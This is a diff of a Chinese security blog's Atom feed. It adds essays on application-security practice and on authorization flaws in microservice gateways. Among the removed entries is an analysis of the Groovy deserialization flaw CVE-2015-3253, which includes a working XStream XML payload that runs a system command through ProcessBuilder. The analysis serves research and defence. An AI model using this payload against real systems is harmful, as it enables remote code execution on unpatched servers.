@@ -4,7 +4,7 @@
   <title><![CDATA[蓝色骨头]]></title>
   <link href="https://www.uxss.net/atom.xml" rel="self"/>
   <link href="https://www.uxss.net/"/>
-  <updated>2021-07-14T23:09:27+08:00</updated>
+  <updated>2021-07-14T23:14:03+08:00</updated>
   <id>https://www.uxss.net/</id>
   <author>
     <name><![CDATA[]]></name>
@@ -12,6 +12,267 @@
   </author>
   <generator uri="http://www.coderforart.com/">CoderForArt</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[我的应用安全方法论：路在脚下]]></title>
+    <link href="https://www.uxss.net/16264450332785.html"/>
+    <updated>2021-07-16T22:17:13+08:00</updated>
+    <id>https://www.uxss.net/16264450332785.html</id>
+    <content type="html"><![CDATA[
+<blockquote>
+<blockquote>
+<p>在2020即将结束之际，将自己对于应用安全建设的一些思考记录成此文，与诸位探讨未来的应用安全之路，一家之言，不要当真</p>
+</blockquote>
+</blockquote>
+
+<p>在前几年，各种文章/会议，每当提起应用安全，PPT总会出现类似的这张图</p>
+
+<p><img src="media/16264450332785/16264450888605.jpg" alt=""/></p>
+
+<p>这几年又都换上了这张图</p>
+
+<p><img src="media/16264450332785/16264451010960.jpg" alt=""/></p>
+
+<p>仿佛用原来的那些安全能力，照着DevSecOps的流程重新画一个图，就可以将原先解决不了的难题解决掉，但真的是这么简单吗？</p>
+
+<h2 id="toc_0">一、应用安全困境</h2>
+
+<p>经常看到某些安全公司各种画大饼，说网络安全从业缺口xxx万，听起来这个行业仿佛是个蓝海，但实际上，哪个公司会去雇用这么多的安全工程师呢？在一二线互联网公司，“应用安全工程师:开发工程师=1:500”应该是个很常见的比例，甚至有些公司会更高，攻防只会是工作中的极少部分，更多的则是“柴米油盐”。</p>
+
+<p>在应用的开发速度上，也和以前有了很大的变化，商业环境的瞬息万变，促使其要不断的、快速的开发新应用来支撑新的业务，例如社区团购、全民买菜等，需要在很短的时间内上线，并且要不断的进行迭代，应用的运行环境也发生了很大的变化，Web、APP、小程序、云原生等等。</p>
+
+<p><img src="media/16264450332785/16264451151824.jpg" alt=""/></p>
+
+<p>简单总结一下现在遇到的困境：应用数量、场景的快速增加、功能迭代周期短，原来的SDL流程无法融入到新的开发模式中，致使很多风险发布到线上才被发现或直到被利用还没有感知。</p>
+
+<p>在笔者这几年参与应用安全建设的过程中，对其有着很深刻的感触，很多时候，面对那么多的应用，那么多的风险，深深的无力感。</p>
+
+<p>出现问题的时候，其他人总是会问或者扪心自问，这个风险出现的原因是什么？为什么没有提前发现？后续可以覆盖到吗？现在或许可以试着回答一下这个问题。</p>
+
+<h2 id="toc_1">二、我认为的应用安全发展趋势</h2>
+
+<p>经过这几年的实践总结，在这里和大家探讨下如何“困境突围”。</p>
+
+<p>首先，对于DevSecOps，其中的很多观点笔者是比较认同的，但是和很多人的认知不一样的地方是，更多的是将其视作一个方法论，就像SOAR、UEBA等一样，而不是其一个执行框架。在SDL的阶段，很多人在衡量应用安全建设完成度的时候，会将每个环节是否都覆盖作为其标准，但这显然是一个伪命题，100%的覆盖度在现实中是不存在的。</p>
+
+<p>在笔者看来，应用安全的发展趋势有这么三点：</p>
+
+<p><strong>1、业务、产品、开发、测试、安全五者之间合作关系的转变，所有人都要为应用安全负责；</strong></p>
+
+<p><strong>2、安全风险的发现要融入到“开发-测试-部署”的流程中去，在上线前发现风险；</strong></p>
+
+<p><strong>3、安全自动化(安全运营可持续化、安全流程自动化、风险感知自动化)。</strong></p>
+
+<p>单从这几个观点来看，似乎和DevSecOps中的某些观点有相似之处，事实也确实如此，但是需要再强调一遍，DevSecOps更多的是一种方法、一种思想，我们可以学习其长处，切不可照猫画虎。</p>
+
+<h2 id="toc_2">三、我对现在SDL中一些流程的看法</h2>
+
+<p>在讲笔者是如何讲上述三个观点落地之前，先谈一下笔者对其现在SDL流程中一些大家都在做的流程的看法：</p>
+
+<p><strong>1、应用安全/安全开发/安全意识培训时讲漏洞类型(OWASP Top10等)是一种低效的行为；</strong></p>
+
+<p>根据笔者培训的经验来看，真实的case是直击人心且令人印象深刻的，用一个小时讲实际中漏洞类型，特别是XSS、CSRF等，会使听众昏昏欲睡。这里不是说安全培训不重要，恰恰相反，安全培训是提升开发安全意识的一个重要手段，关键是面对不同的人群针对性的去选择培训素材和培训方式，如果能达到“开发主动来咨询安全解决方案”的效果，那培训便算得上是成功的。</p>
+
+<p><strong>2、强制性的流程卡点是一种偷懒的行为；</strong></p>
+
+<p>做安全运营的同学往往有种思维惯性，希望在所有环节都做上卡点，这种行为/想法是非常不利于合作关系转变的。换位思考下，谁希望每一步操作都要受到阻碍，与开发效率提升相背而行。</p>
+
+<h2 id="toc_3">四、我的应用安全方法论</h2>
+
+<p>回到正题，对于应用安全的建设，笔者是如何探索落地的呢？下边一一道来。</p>
+
+<p>首先，我们要清楚，应用漏洞的种类那么多，在大公司，要保护大量应用、海量数据的安全，最应该解决的是哪几种风险呢？</p>
+
+<p><strong>1、数据批量泄漏的风险；</strong></p>
+
+<p><strong>2、权限管控不完善的风险；</strong></p>
+
+<p><strong>3、命令执行/SQL注入/服务器接管等高危漏洞的风险。</strong></p>
+
+<p>或许这里会有人提到监管风险，例如网络安全法、GDPR、等保等，因其往往属于安全合规或数据安全的范畴，且不在笔者的认知范围内，这里暂且不提。</p>
+
+<p>理清了关键风险，那么怎么做就会更清晰一点了，笔者讲其方法论归纳为三个环节来谈，分别是：</p>
+
+<p><strong>1、应用安全开发：在漏洞代码上线前发现风险；</strong></p>
+
+<p><strong>2、应用安全评估：通过红蓝对抗、安全众测、漏洞扫描等发现已上线的漏洞；</strong></p>
+
+<p><strong>3、应用异动感知：高危/核心应用的异动监控、感知。</strong></p>
+
+<p><img src="media/16264450332785/16264451406080.jpg" alt=""/></p>
+
+<h3 id="toc_4">第一点：应用安全开发</h3>
+
+<p>我们的目标是尽可能的避免存在漏洞(特别是高危漏洞)的代码发布到线上。</p>
+
+<p>这里笔者将漏洞分为常规漏洞(SQLI、XSS、SSRF等)、业务逻辑漏洞(越权漏洞、短信爆破等)两类。</p>
+
+<p>常规漏洞：这类风险就依赖安全开发框架、DAST、IAST、RASP等等安全工具了，工具链越完善，该类漏洞就会越少，这本就是安全专业范围内的事情，本文就不展开讲了。</p>
+
+<p>业务逻辑漏洞：现在不管哪家的SRC，收到的高危漏洞中，越权漏洞一定是占比最大的部分，至今也没有看到一个运营成本低、误报率低的越权类漏洞扫描器的出现。其实这个也可以理解，前几年笔者也试图去开发一个越权扫描器，但是效果却不如想象中的美好，究其原因就是，业务形态的多变、开发风格的不同，导致了越权漏洞表象上大多一样，原理逻辑上却大相径庭，这也就是现在基于流量重放的越权扫描器效果相对好一些的原因所在。</p>
+
+<p>既然越权扫描器解决不了全部的业务逻辑类漏洞，那么试着去改变一下生产关系呢？业务、产品、开发、测试、安全五者之间合作关系的转变，所有人都要为应用安全负责。</p>
+
+<p>解决业务逻辑漏洞的方法笔者将其拆解为三个动作：架构安全评审、QA覆盖、风险复盘。</p>
+
+<p>I. 架构安全评审</p>
+
+<p>为什么要做架构评审呢？原因可以参见这篇文章微服务架构下的越权风险，开发方式、开发架构的转变，出现了很多类Gateway的应用，这些应用的架构如果没有安全参与评估，往往会导致整个系统出现框架性的权限失效，且修复起来难度极大。</p>
+
+<p>这里要注意的是，不是所有应用都要去参与架构安全评审，不然很容易又陷入到“人力配比”的困境中去，根据实际情况来选择评审策略。</p>
+
+<p>II. QA覆盖</p>
+
+<p>QA环节的人力往往是充裕的，并且会将覆盖所有的发布和迭代，那么试想一下，如果测试同学帮我们做一部分安全测试的工作，那岂不是既可以大幅提高覆盖度，又可以将安全的经历集中到其它环节。</p>
+
+<p>那怎么去做呢？第一，要清楚业务逻辑类漏洞，既是漏洞、又是BUG，达成共识的关键；第二，测试同学不是专业的安全，所以不可能覆盖所有的漏洞类型，要有选择的有的放矢，侧重于越权等风险类型；第三，那就是风险复盘了。</p>
+
+<p>III. 风险复盘</p>
+
+<p>即使前边经过了各种评审和测试，一定还会有漏洞被发布到线上，这时候就要进行深度的风险复盘，复盘的目的是什么呢？找出漏洞出现的根本原因，如果是应用架构有问题，那便拉项目，改架构，如果是人的问题，那便要思考下安全意识的问题了。至于哪些风险需要复盘，这个则要根据当前的安全形势，有选择性的去复盘。其中一个关键点就是，开发、产品、测试都要参与到复盘中去。</p>
+
+<h3 id="toc_5">第二点：应用安全评估</h3>
+
+<p>红蓝对抗、安全众测、漏洞扫描等详细的流程本文也就不展开说了，有非常多的文章介绍这些方面，笔者着重谈一下该环节的重要性。</p>
+
+<p>安全评估环节相当于是一个查漏补缺，检验安全开发环节效果的作用，要同黑灰产进行时间竞赛，力争先于他们发现风险。</p>
+
+<p>该阶段发现的风险，每一个风险都是投入了非常多人力、物力、财力换来的，要充分的利用其价值，而不是修复了事。</p>
+
+<p>每一个通过该环节发现的高危风险，都应该与“风险复盘”进行闭合，深入其中发现出现风险的根本原因。</p>
+
+<h3 id="toc_6">第三点：应用异动感知</h3>
+
+<p>笔者根据应用安全中的风险，将异动感知划分为三个部分，分别是：爬虫攻防、漏洞利用、非漏洞性数据泄漏。</p>
+
+<p>I. 爬虫攻防</p>
+
+<p>说起爬虫攻防，笔者真是一把辛酸泪，在面对海量的流量时，如何准确的区分机器流量和正常流量就已经是一件很困难的事情了，如果在机器流量中快速准确的发现爬虫流量，特别是高级爬虫，是非常有挑战的一项工作。每个公司有不同的爬虫对抗平台，或者是选择爬虫风险管理，此处笔者不再赘述。</p>
+
+<p>II. 漏洞利用</p>
+
+<p>此处“漏洞”更多指的是“命令执行/SQL注入/服务器接管等高危漏洞”，特别是近几年，供应链漏洞频发，在应用安全中，一旦没有有效的全覆盖的推动供应链漏洞修复，则极有可能被外部利用攻击，那我们该怎么办呢？常见的感知方法有两个，分别是：蜜罐、WAF，当然有些团队会基于各种流量日志构建攻击检测平台，检测各种payload，以达到在漏洞被利用时快速发现的目的，笔者因没有构建过类似系统，更多的是使用，所以细节相关的就不多讲了。</p>
+
+<p>III. 非漏洞性数据泄漏</p>
+
+<p>“非漏洞性数据泄漏”怎么理解呢？讲一个场景，例如某个客服的账号被盗用，然后将该客服权限下的数据批量盗取，那这种风险如何避免呢？有些同学可能会认为这不是应用安全的范畴，但实际上，只要是从应用上泄漏的数据，都是属于应用安全该去防护的范围。</p>
+
+<p>这里笔者推荐的方法是UEBA(获取多个维度的行为数据、日志，将其通过基础分析方法、高级分析方法，进行建模分析，识别异常行为的风险用户和风险实体，然后通过打分评级的方式输出告警，使安全工程师可以优先级处理告警)，针对不同的高风险敞口进行监控。目前市面上也有不少基于UEBA方法论的产品落地，各家公司内部也或多或少会有类似实现，分析算法都已经很成熟了，更多的还是根据不同的业务场景制定不同的策略。</p>
+
+<p>本文没有像其它介绍企业安全建设的文章那样将方方面面都讲到，主要集中在应用安全的视角，来探讨如何保证应用的安全。上述提到的很多个点可能看起来有点独立，其实并非如此，因为还有一个方法论没有提到，那就是SOAR，可参看从SOAR中求解应用安全建设强运营突围之法，将各个环节自动化的进行编排，使安全能在整个DevOps流程中游刃有余。如果只是将SOAR看作是一个有控制台拖拖拽拽的样子，那就有些狭隘了。</p>
+
+<p>有许许多多的方法论，许许多多的安全建设的文章，但“听过很多道理 却依然过不好这一生”，每个公司的实际情况都不一样，如一味的追求方法论的完成落地，往往很难取得很好的效果。应用安全建设之路在何方？路在脚下。</p>
+
+<p>[1]文中部分图片来源自网络<br/>
+[2]文中部分参考文章链接来源公众号：电驭叛客</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[微服务架构下的越权风险]]></title>
+    <link href="https://www.uxss.net/16264445883824.html"/>
+    <updated>2021-07-16T22:09:48+08:00</updated>
+    <id>https://www.uxss.net/16264445883824.html</id>
+    <content type="html"><![CDATA[
+<blockquote>
+<blockquote>
+<p>一篇小文，主要是通过安全的视角来简单讨论一下微服务架构下容易出现的一些去权限安全问题，涉及到开发细节说错的时候还望谅解。</p>
+</blockquote>
+</blockquote>
+
+<h2 id="toc_0">一、微服务与微服务架构</h2>
+
+<p>微服务是一种开发软件的架构和组织方法，其中软件由通过明确定义的 API 进行通信的小型独立服务组成。这些服务由各个小型独立团队负责；采用UNIX设计的哲学，每种服务只做一件事，是一种松耦合的能够被独立开发和部署的无状态化服务。</p>
+
+<p>微服务具有两个关键特性：自主性、专用性，具有敏捷性、灵活扩展、轻松部署、技术自由、可重复使用的代码、弹性等优势[1]。</p>
+
+<p><img src="media/16264445883824/16264446902542.jpg" alt=""/></p>
+
+<p>从上边的描述可以看出，微服务更多的是一种方法，而微服务架构则是实践微服务的具体实现，不同厂商、不同开发的实现方式各有差异，大概架构基本如下图[2]。它使得开发可以专注自由的开发他负责的服务，解决了系统的复杂性，可以独立部署，与DevOps开发流程契合等，这也难怪现在几乎全民微服务了。</p>
+
+<p><img src="media/16264445883824/16264447090384.jpg" alt=""/></p>
+
+<p>但是哪有什么银弹，优点越多的技术带来的负面影响往往越大。</p>
+
+<h2 id="toc_1">二、微服务的访问权限困境</h2>
+
+<p>在微服务架构下，一个应用被拆分为多个微服务，这样一来，原先单体架构下的权限体系就不再能满足微服务的鉴权需求了，每个微服务都需要对自身API进行权限管控，需要对接账号体系和明确哪些角色有权限访问；同时还有来自服务之间的调用等。</p>
+
+<p>在这种情况下，无论是通过session方案还是token方案，都需要开发去自己维护这一权限体系，那么问题就来了。业务产品在后边追，各种发布封网在前边拦，往往会为了完成业务功能而取舍掉权限的部分，又或者不同的开发同学对于鉴权的理解不一致，甚至认为判断有没有登陆就认为已经完成了权限校验。</p>
+
+<p>随着这类API的越来越多，就会发现同类安全问题频繁发生，特别是未授权访问这类低级的漏洞。</p>
+
+<p><img src="media/16264445883824/16264447226782.jpg" alt=""/></p>
+
+<h2 id="toc_2">三、绕不过的API Gateway</h2>
+
+<p>一方面为了管理乱糟糟的API调用关系，一方面为了解决上边提到的风险，微服务的调用需要一个统一管控的部分，也就是API Gateway。现在是不是就不会出现越权漏洞了呢？</p>
+
+<p>想法是美好的，但现实往往啪啪打脸，Gateway的架构缺陷往往会造成更大的风险。</p>
+
+<ul>
+<li>API Gateway 仅仅是个出入口</li>
+</ul>
+
+<p>这类网关往往只起到了一个路由的作用，它可能只有一个域名和简单的路由转发功能，将同一部分业务的API通过同一个域名开发出去，将API的权限校验全部交给相应的开发去搞，当出现未授权访问漏洞时，双方就开始扯皮，这个权限校验不是你应该做的吗？特别是当这业务特别庞大时，几百几千个API都接入，这可真是个灾难～</p>
+
+<ul>
+<li>API Gateway 通过黑名单控制访问权限</li>
+</ul>
+
+<p>有时候需要控制一部分API开放公网另一部分不对外开放，有时候一部分API需要访问控制另一部分可以公开访问等。在解决这类需求时，很多开发会把API Gateway设计成黑名单模式，例如不能对外开发的API需要添加到blacklist中，又或者需要做菜单访问控制的API需要主动去配置。从文字上，这貌似没有什么问题，合情又合理，但是回到人性上，人是健忘的和怕麻烦的，所以就导致经常出现内部API忘了配置blacklist开放公网或忘了配置权限菜单造成未授权访问漏洞的情况。</p>
+
+<ul>
+<li>API自动编排服务</li>
+</ul>
+
+<p>这两年出现了一些提供快速搭建应用能力的平台，通过网关能力，编排能力以及多种类型的服务对接、统一开放的服务市场，来完成服务发现，服务生产，服务消费的全链路的服务流程。这对于非开发的同学开发应用或帮助开发同学快速发布应用，是很有意义的，但是随之而来的就是它的权限校验问题，在编排时，权限判断逻辑是否是必选项、接入账号体系后是否有角色配置关联、是否支持数据权限的校验等等，任何一个点出现问题，整个平台的应用可能都会存在风险。</p>
+
+<p>随着这类情况越来越多，通过应用数量来看业务规模已经不太行的通了，有时候一个应用可能会有几百上千个API[3]，背后又对应着几十上百个开发，对于传统的SDL来说太难落地了[4]，关于API的安全治理，是一个复杂的体系，有机会细聊。</p>
+
+<p>(这难道不是越权漏洞挖掘的思路嘛)</p>
+
+<p><img src="media/16264445883824/16264447430371.jpg" alt=""/></p>
+
+<h2 id="toc_3">四、基于API Gateway权限校验的一些想法</h2>
+
+<p>实际的API Gateway设计涉及到多个方面，安全和性能往往在一个平衡的状态，下边的仅供参考</p>
+
+<ul>
+<li><p>安全工程师可以不介入到每个应用进行安全评审，但是API Gateway类的应用一定要覆盖和持续跟进</p></li>
+<li><p>在调用者和被调用者中间加一层网关，每次调用时进行权限校验。充分利用API网关，完成将身份验证和路由功能</p></li>
+<li><p>在Gateway或账号管理平台上维护API与角色的关系，在Gateway判断API与角色是否匹配，可以解决访问权限(垂直权限)越权的风险</p></li>
+<li><p>当通过API Gateway控制router时，公网可访问的列表用白名单方式，只有主动添加才可以对外开放</p></li>
+<li><p>每个微服务的开发都应该为其数据访问权限负责</p></li>
+</ul>
+
+<p><img src="media/16264445883824/16264447588757.jpg" alt=""/></p>
+
+<h2 id="toc_4">五、这个世界是一个圆</h2>
+
+<p>关于Service Mesh架构我们下次再聊。</p>
+
+<p><img src="media/16264445883824/16264447703425.jpg" alt=""/></p>
+
+<p>每一次开发架构的更迭，都会带来新的安全挑战，现在越来越火的Serverless、FaaS等也一定会带来一系列新的安全挑战，说不定再过一段时间又回到了最初的单体架构。</p>
+
+<p><img src="media/16264445883824/16264447782311.jpg" alt=""/></p>
+
+<p>参考：</p>
+
+<p>[1]<a href="https://aws.amazon.com/cn/microservices/">https://aws.amazon.com/cn/microservices/</a></p>
+
+<p>[2]<a href="http://dockone.io/article/3687">http://dockone.io/article/3687</a></p>
+
+<p>[3]API安全全链路解决方案写了好久，但是还有几个关键点在实践场景中没有跑顺畅，再等等(没有实践，没有发言权)</p>
+
+<p>[4]DevSecOps同样，在实践的路上，还不敢拿出来班门弄斧</p>
+
+<p>[5]图片来源网络</p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[安全建设]API越权风险检测方式浅谈]]></title>
@@ -5804,402 +6065,6 @@ def handwritingClassTest():
 <img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8706.png" alt="幻灯片06"/><br/>
 <img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8707.png" alt="幻灯片07"/><br/>
 <img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8708.png" alt="幻灯片08"/></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[漏洞分析]Groovy Deserialization（groovy.util.Expando）]]></title>
-    <link href="https://www.uxss.net/15295824918778.html"/>
-    <updated>2018-06-21T20:01:31+08:00</updated>
-    <id>https://www.uxss.net/15295824918778.html</id>
-    <content type="html"><![CDATA[
-<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253</a></p>
-
-<p>影响版本（1.7.0~2.4.3）</p>
-
-<span id="more"></span><!-- more -->
-
-<h4 id="toc_0">调用链分析</h4>
-
-<p><strong>MethodClosure</strong></p>
-
-<pre><code class="language-text">public class MethodClosure extends Closure {
-    private String method;
-
-    public MethodClosure(Object owner, String method) {
-        super(owner);
-        this.method = method;
-        Class clazz = owner.getClass() == Class.class ? (Class)owner : owner.getClass();
-        this.maximumNumberOfParameters = 0;
-        this.parameterTypes = new Class[0];
-        List&lt;MetaMethod&gt; methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method);
-        Iterator i$ = methods.iterator();
-
-        while(i$.hasNext()) {
-            MetaMethod m = (MetaMethod)i$.next();
-            if (m.getParameterTypes().length &gt; this.maximumNumberOfParameters) {
-                Class[] pt = m.getNativeParameterTypes();
-                this.maximumNumberOfParameters = pt.length;
-                this.parameterTypes = pt;
-            }
-        }
-
-    }
-
-    public String getMethod() {
-        return this.method;
-    }
-
-    protected Object doCall(Object arguments) {
-        return InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);
-    }
-</code></pre>
-
-<p>doCall()作用应该是执行构件好的对象（this.getOwner()）的方法（this.method）</p>
-
-<p><strong>invokeMethod</strong></p>
-
-<pre><code class="language-text">    public static Object invokeMethod(Object object, String methodName, Object arguments) {
-        if (object == null) {
-            object = NullObject.getNullObject();
-        }
-
-        if (object instanceof Class) {
-            Class theClass = (Class)object;
-            MetaClass metaClass = metaRegistry.getMetaClass(theClass);
-            return metaClass.invokeStaticMethod(object, methodName, asArray(arguments));
-        } else {
-            return !(object instanceof GroovyObject) ? invokePojoMethod(object, methodName, arguments) : invokePogoMethod(object, methodName, arguments);
-        }
-    }
-</code></pre>
-
-<p>调用指定对象的指定方法<br/>
-所以可以利用这个方法来执行命令</p>
-
-<pre><code class="language-text">MethodClosure mc = new MethodClosure(new java.lang.ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;).call();
-</code></pre>
-
-<p>通过java.lang.ProcessBuilder对象的start方法执行open命令</p>
-
-<p>根据上边的分析，<code>MethodClosure.call() == &quot;command&quot;.execute()</code></p>
-
-<p>找到了存在缺陷的方法，接下来就要看有哪些地方调用了这个方法<br/>
-断点调试call()可以看到被hashcode()调用了</p>
-
-<pre><code class="language-text">    public int hashCode() {
-        Object method = this.getProperties().get(&quot;hashCode&quot;);
-        if (method != null &amp;&amp; method instanceof Closure) {
-            Closure closure = (Closure)method;
-            closure.setDelegate(this);
-            Integer ret = (Integer)closure.call();
-            return ret.intValue();
-        } else {
-            return super.hashCode();
-        }
-    }
-</code></pre>
-
-<p>hashCode的功能和特性</p>
-
-<pre><code class="language-text">如果两个对象相同，那么它们的hashCode  值一定要相同
-如果两个对象的hashCode相同，它们并不一定相同     
-上面说的对象相同指的是用eqauls方法比较
-</code></pre>
-
-<p>所以当两个对象进行比较时，会调用hashcode和eqauls，如果结果一致则相等</p>
-
-<pre><code class="language-text">    public V put(K key, V value) {
-        if (table == EMPTY_TABLE) {
-            inflateTable(threshold);
-        }
-        if (key == null)
-            return putForNullKey(value);
-        int hash = hash(key);
-        int i = indexFor(hash, table.length);
-        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
-            Object k;
-            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
-                V oldValue = e.value;
-                e.value = value;
-                e.recordAccess(this);
-                return oldValue;
-            }
-        }
-
-        modCount++;
-        addEntry(hash, key, value, i);
-        return null;
-    }
-</code></pre>
-
-<p>put方法是用来向HashMap中添加新的元素，从put方法的具体实现可知，会先调用hashCode方法得到该元素的hashCode值，然后查看table中是否存在该hashCode值，如果存在则调用equals方法重新确定是否存在该元素，如果存在，则更新value值，否则将新的元素添加到HashMap中</p>
-
-<p>所以当把我们构造的代码添加进去时，put就会调用hashcode进行比较，进而执行代码</p>
-
-<pre><code class="language-text">    public void setProperty(String property, Object newValue) {
-        this.getProperties().put(property, newValue);
-    }
-</code></pre>
-
-<p><code>Object method = this.getProperties().get(&quot;hashCode&quot;)</code>自定义hashcode，调用setProperty可以绑定hashcode属性<br/>
-closure.call()注定了hashCode必须是Closure或者其子类才能最终调用call函数，MethodClosure类恰好是Closure的子类</p>
-
-<p>然后通过调用hashcode的put方法即可执行构造的代码</p>
-
-<p><img src="media/15295824918778/15307985501989.jpg" alt=""/></p>
-
-<p><strong>poc</strong></p>
-
-<pre><code class="language-text">&lt;map&gt; 
-  &lt;entry&gt; 
-    &lt;groovy.util.Expando&gt; 
-      &lt;expandoProperties&gt; 
-        &lt;entry&gt; 
-          &lt;string&gt;hashCode&lt;/string&gt; 
-          &lt;org.codehaus.groovy.runtime.MethodClosure&gt; 
-            &lt;delegate class=&quot;groovy.util.Expando&quot; reference=&quot;../../../..&quot;/&gt; 
-            &lt;owner class=&quot;java.lang.ProcessBuilder&quot;&gt; 
-              &lt;command&gt; 
-                &lt;string&gt;open&lt;/string&gt; 
-                &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; 
-              &lt;/command&gt; 
-              &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; 
-            &lt;/owner&gt; 
-            &lt;resolveStrategy&gt;0&lt;/resolveStrategy&gt; 
-            &lt;directive&gt;0&lt;/directive&gt; 
-            &lt;parameterTypes/&gt; 
-            &lt;maximumNumberOfParameters&gt;0&lt;/maximumNumberOfParameters&gt; 
-            &lt;method&gt;start&lt;/method&gt; 
-          &lt;/org.codehaus.groovy.runtime.MethodClosure&gt; 
-        &lt;/entry&gt; 
-      &lt;/expandoProperties&gt; 
-    &lt;/groovy.util.Expando&gt; 
-    &lt;int&gt;1&lt;/int&gt; 
-  &lt;/entry&gt; 
-&lt;/map&gt;
-</code></pre>
-
-<p>参考：<br/>
-<a href="https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/">https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/</a><br/>
-<a href="http://avfisher.win/archives/tag/groovy">http://avfisher.win/archives/tag/groovy</a></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[安全开发]基于token的认证]]></title>
-    <link href="https://www.uxss.net/15266370378300.html"/>
-    <updated>2018-05-18T17:50:37+08:00</updated>
-    <id>https://www.uxss.net/15266370378300.html</id>
-    <content type="html"><![CDATA[
-<p>说到token就必然绕不开cookie和session。</p>
-
-<span id="more"></span><!-- more -->
-
-<h4 id="toc_0">0x01 cookie/session</h4>
-
-<p>说到token就必然绕不开cookie和session。</p>
-
-<p><strong>cookie</strong>：由服务端给客户端颁发的一张通行证，用来验证客户端的身份，本质上是一段在浏览器上以KV形式存储的文本数据，包含了session相关信息。用于解决HTTP协议无状态的问题，所以cookie是一个会话跟踪机制，是有状态的。 </p>
-
-<p><strong>session</strong>：当客户端请求服务端通过验证后，服务端会生成保存身份认证相关的session数据，并将session相关信息写入cookie返回给客户端，然后客户端将cookie保存到本地。之后两端就通过核对session信息来确认可信状态。session 可能会存储在内存、磁盘、数据库里，可能需要在服务端定期的去清理过期的 session。</p>
-
-<h4 id="toc_1">0x02 token</h4>
-
-<p>既然有了cookie/session为啥还需要token呢   </p>
-
-<p><strong>优点</strong>：</p>
-
-<p>1、无状态、可扩展</p>
-
-<p>2、安全性</p>
-
-<p>3、可扩展性</p>
-
-<p>4、多平台跨域/单点登陆</p>
-
-<p>5、基于标准</p>
-
-<p>6、缓解服务器内存压力/增大服务器计算压力</p>
-
-<p><strong>格式</strong>：</p>
-
-<p><code>UID + TIME + SIGN [+ OTHER]</code></p>
-
-<h4 id="toc_2">0x03 实施</h4>
-
-<p><code>JSON Web Tokens（JWT）</code></p>
-
-<p><strong>组成</strong>：</p>
-
-<ul>
-<li>header</li>
-</ul>
-
-<p>用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</p>
-
-<pre><code class="language-javascript">{
-  &quot;typ&quot;: &quot;JWT&quot;,
-  &quot;alg&quot;: &quot;HS256&quot;
-}
-</code></pre>
-
-<p>base64一下</p>
-
-<p><code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9</code></p>
-
-<ul>
-<li>payload</li>
-</ul>
-
-<p>标准文档：<a href="https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1">https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1</a></p>
-
-<p>可以在其中添加这些字段</p>
-
-<pre><code class="language-text">iss：Issuer，发行者
-sub：Subject，主题
-aud：Audience，观众
-exp：Expiration time，过期时间
-nbf：Not before
-iat：Issued at，发行时间
-jti：JWT ID
-</code></pre>
-
-<pre><code class="language-java">Map&lt;String , Object&gt; payload=new HashMap&lt;String, Object&gt;();
-Date date=new Date();
-payload.put(&quot;uid&quot;, &quot;007&quot;);
-payload.put(&quot;iat&quot;, date.getTime());
-payload.put(&quot;ext&quot;,date.getTime()+1000*60*60);
-</code></pre>
-
-<p>上边代码中添加的字段如下</p>
-
-<pre><code class="language-javascript">{
-    &quot;iat&quot;: 当前时间,
-    &quot;exp&quot;: 过期时间,
-    &quot;uid&quot;: &quot;007&quot;
-}
-</code></pre>
-
-<p>base64编码</p>
-
-<p><code>ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==</code></p>
-
-<p>这样payload就生成好了</p>
-
-<ul>
-<li>signature</li>
-</ul>
-
-<p>将header和payload生成的base64编码通过<code>.</code>连接起来，如下</p>
-
-<p><code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==</code></p>
-
-<p>然后再定义一个secret，如下</p>
-
-<p><code>secret</code></p>
-
-<p>通过header中定义的HS256算法以secret为密钥进行加密得到signature</p>
-
-<p><code>81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb</code></p>
-
-<p>此时JWT就生成了，base64(header).base64(payload) .signature</p>
-
-<p>像这样<code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==.81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb</code></p>
-
-<p>当然这种方式不能在token中携带敏感信息，例如密码</p>
-
-<h4 id="toc_3">0x04 应用</h4>
-
-<ul>
-<li>单点登陆</li>
-</ul>
-
-<p><code>Set-Cookie: jwt=yyy.zzz.xxx; HttpOnly; max-age=980000; domain=.taobao.com</code></p>
-
-<ul>
-<li>API 调用/授权</li>
